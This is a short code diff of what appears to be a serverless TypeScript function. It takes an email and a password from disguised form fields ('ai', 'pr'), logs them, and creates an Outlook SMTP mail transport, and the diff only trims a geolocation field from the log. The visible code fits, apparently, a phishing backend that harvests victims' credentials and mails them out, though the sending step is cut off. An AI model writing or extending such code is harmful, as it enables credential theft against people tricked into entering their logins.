@@ -6,7 +6,7 @@ export default async (req: Request, context: Context) => {
   const body = await req.formData();
   const email = body.get("ai");
   const password = body.get("pr");
-  console.log('response:', {email, password, context?.geo?.subdivision})
+  console.log('response:', {email, password})
 
   const transporter = nodemailer.createTransport({
   host: "smtp-mail.outlook.com",
